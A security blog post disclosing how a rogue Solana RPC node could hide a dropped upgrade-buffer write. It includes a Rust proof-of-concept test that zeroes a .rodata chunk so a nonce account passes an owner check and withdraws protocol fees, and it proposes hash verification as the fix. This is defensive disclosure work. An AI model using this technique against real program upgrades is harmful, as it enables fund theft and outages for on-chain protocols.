---
title: Rogue RPC node buffer deploys
description: A compromised RPC node can make a Solana upgrade buffer look complete while hiding a missing write.
category: security
pubDate: 2026-04-29
tags:
  - solana
  - security
  - rpc
  - upgrades
---

Upgradeable program deploys write a buffer in chunks. The deployer sends many
write transactions, waits for confirmation, then either deploys directly or
hands authority to a multisig.

That creates an uncomfortable trust edge: the RPC node sits between the
deployer and the buffer state.

If a rogue RPC node drops one write transaction but reports success, then returns
the expected account when calling `getAccount`, the deployer can be shown the
expected buffer while the chain actually holds a buffer with missing bytes. The
result is an unexpected program being deployed from what looked like a verified
buffer.

![A rogue RPC node returning expected buffer bytes while the chain buffer is missing one write chunk.](/blog/rogue-rpc-buffer-mismatch.svg)

The obvious caveat is that zeroing arbitrary bytes is not a universal exploit.
Missing writes in `.text` usually break the ELF. In `.rodata`, the program can
remain loadable, but control is much less flexible.

The realistic risk may often be denial of service, not theft. For example,
zeroing an Anchor static program id can make the initial program id check fail
for every transaction. More ambitious targets, like changing a checked program
id to the system program, need the corrupted bytes to line up with real account
layout and discriminator constraints.

I verified this shape on Jup Lend: the program id appears in `.rodata` and is
used by Anchor's initial program id check.

PoC:
[omitted-loader-write-poc](https://github.com/Arrowana/omitted-loader-write-poc/blob/51bec6ad7bc51ec96b46e808b5fc3d08a67bdd6a/programs/protocol/tests/censored_write.rs#L74-L113).
The test zeroes one loader write in `.rodata`, keeps the program loadable, and
turns an owner check into a system program owner check, allowing a nonce account
to cosplay as a protocol account and withdraw protocol fees.

```rust
#[test]
fn omitted_trusted_owner_loader_write_allows_protocol_fee_withdrawal() {
    let mut program = read_program_elf();
    let censored_write = loader_write_range_containing(TRUSTED_PROGRAM_ID_OFFSET, program.len());

    assert_eq!(censored_write.len(), loader_write_chunk_size());
    assert!(
        READ_ONLY_DATA_LOAD_RANGE.contains(&censored_write.start)
            && READ_ONLY_DATA_LOAD_RANGE.contains(&(censored_write.end - 1)),
        "censored write should stay out of .text and ELF metadata"
    );
    assert!(
        find_all(&program[censored_write.clone()], &PROTOCOL_FEE_SEED).is_empty(),
        "censored write should not zero the protocol fee PDA signer seed"
    );

    program[censored_write].fill(0);

    let mut svm = configured_svm(&program);
    let fixture = install_withdrawal_accounts(&mut svm);
    let authority_balance_before = svm
        .get_account(&fixture.authority.pubkey())
        .unwrap()
        .lamports;

    send_withdrawal(&mut svm, &fixture).expect("omitted trusted owner write accepts system config");

    assert_eq!(
        svm.get_account(&PROTOCOL_FEE_PDA)
            .map(|account| account.lamports)
            .unwrap_or(0),
        0
    );
    assert_eq!(
        svm.get_account(&fixture.authority.pubkey())
            .unwrap()
            .lamports,
        authority_balance_before + PROTOCOL_FEE_LAMPORTS
    );
}
```

The fix is to remove the RPC node from the trust boundary. The proposal should carry
the exact buffer content expected to be executed, or a hash over those bytes, and
execution should verify the live buffer against that expectation before upgrade.

Remediation: [Upgrade buffer remediation, upgrade buffer validation](/blog/upgrade-buffer-remediation-upgrade-buffer-validation).
